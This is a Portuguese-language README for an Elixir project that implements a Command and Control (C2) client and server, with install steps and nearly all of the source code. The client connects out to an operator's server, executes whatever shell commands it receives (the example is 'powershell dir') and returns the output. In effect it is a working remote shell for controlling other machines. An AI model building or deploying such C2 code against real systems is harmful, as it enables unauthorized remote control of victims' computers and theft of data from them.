# Elixir C2 Client & Server 🟣

Este projeto consiste em um cliente e servidor C2 (Command and Control) escritos em Elixir. O servidor envia comandos para o cliente, que os executa e retorna a saída para o servidor. 

## ⚙️ Funcionalidades

- **Cliente**:
  - Conecta a um servidor especificado.
  - Recebe comandos e os executa.
  - Retorna a saída do comando executado para o servidor.

- **Servidor**:
  - Ouve em uma porta especificada para conexões de clientes.
  - Aceita comandos do usuário e os envia para o cliente.
  - Recebe e exibe a resposta do cliente.

## 🚀 Instalação

1. Clone o repositório:
    ```sh
    git clone https://github.com/baku01/elixir-simple-c2
    ```
2. Navegue até o diretório do projeto:
    ```sh
    cd elixir-simple-c2
    ```
3. Instale as dependências:
    ```sh
    mix deps.get
    ```

## 📝 Uso

### Iniciando o Servidor

Para iniciar o servidor, execute:
```elixir
iex -S mix

ElixirC2Server.start_listening(4000)
```

Isso irá iniciar o servidor na porta `4000`.

### Conectando o Cliente

Em outro terminal, execute:
```elixir
iex -S mix

ElixirC2Client.connect()
```

O cliente irá se conectar ao servidor na porta especificada.

### Enviando Comandos

No terminal do servidor, você pode digitar comandos para enviar ao cliente, por exemplo:
```sh
Digite o comando para enviar ao cliente (ex: powershell dir): 
```

O cliente irá executar o comando e retornar a saída, que será exibida no terminal do servidor.

## 📜 Explicação do Código

### Cliente

O módulo `ElixirC2Client` contém as funções do cliente:

- `connect/0`: Conecta ao servidor e chama `listen_for_commands/1` para aguardar comandos.
    ```elixir
    def connect do
      {:ok, socket} = :gen_tcp.connect(@server_address, @server_port, [:binary, packet: :line, active: false])
      Logger.info("Conectado ao servidor")
      listen_for_commands(socket)
    end
    ```

- `listen_for_commands/1`: Aguarda comandos do servidor e chama `execute_command/2` para executá-los.
    ```elixir
    defp listen_for_commands(socket) do
      case :gen_tcp.recv(socket, 0) do
        {:ok, command} ->
          execute_command(socket, command)
          listen_for_commands(socket)
  
        {:error, reason} ->
          Logger.error("Erro ao receber comando: #{inspect(reason)}")
      end
    end
    ```

- `execute_command/2`: Divide o comando recebido em interpretador e argumentos, e chama `execute/2` para executar o comando.
    ```elixir
    defp execute_command(socket, command) do
      [interpreter | args] = String.split(command)
      output = execute(interpreter, args)
      send_output(socket, output)
    end
    ```

- `execute/2`: Executa o comando usando `System.cmd/2` e retorna a saída.
    ```elixir
    def execute(interpreter, args) do
      {output, _exit_status} = System.cmd(to_string(interpreter), Enum.map(args, &to_string/1))
      output
    end
    ```

- `send_output/2`: Envia a saída do comando de volta para o servidor.
    ```elixir
    defp send_output(socket, output) do
      :gen_tcp.send(socket, output <> "\n")
    end
    ```

### Servidor

O módulo `ElixirC2Server` contém as funções do servidor:

- `start_listening/1`: Inicia o servidor na porta especificada e aceita conexões de clientes.
    ```elixir
    def start_listening(port) do
      {:ok, socket} = :gen_tcp.listen(port, [:binary, packet: :raw, active: false, reuseaddr: true])
      Logger.info(@server_start_msg <> Integer.to_string(port))
      {:ok, client} = :gen_tcp.accept(socket)
      Logger.info("Cliente conectado")
      command_loop(client)
    end
    ```

- `command_loop/1`: Loop principal que aguarda comandos do usuário e os envia para o cliente.
    ```elixir
    defp command_loop(client) do
      command = IO.gets("Digite o comando para enviar ao cliente (ex: powershell dir): ")

      case command do
        :eof ->
          Logger.info("Encerrando servidor.")
          :gen_tcp.close(client)
  
        _ ->
          send_command(client, String.trim(command))
          receive_response(client)
          command_loop(client)
      end
    end
    ```

- `send_command/2`: Envia o comando para o cliente.
    ```elixir
    defp send_command(client, command) do
      :gen_tcp.send(client, command <> "\n")
    end
    ```

- `receive_response/1`: Recebe e exibe a resposta do cliente.
    ```elixir
    defp receive_response(socket) do
      case :gen_tcp.recv(socket, 0) do
        {:ok, response} ->
          Logger.info(@data_received_msg <> response)
  
        {:error, reason} ->
          Logger.error(@data_receive_error_msg <> inspect(reason))
      end
    end
    ```
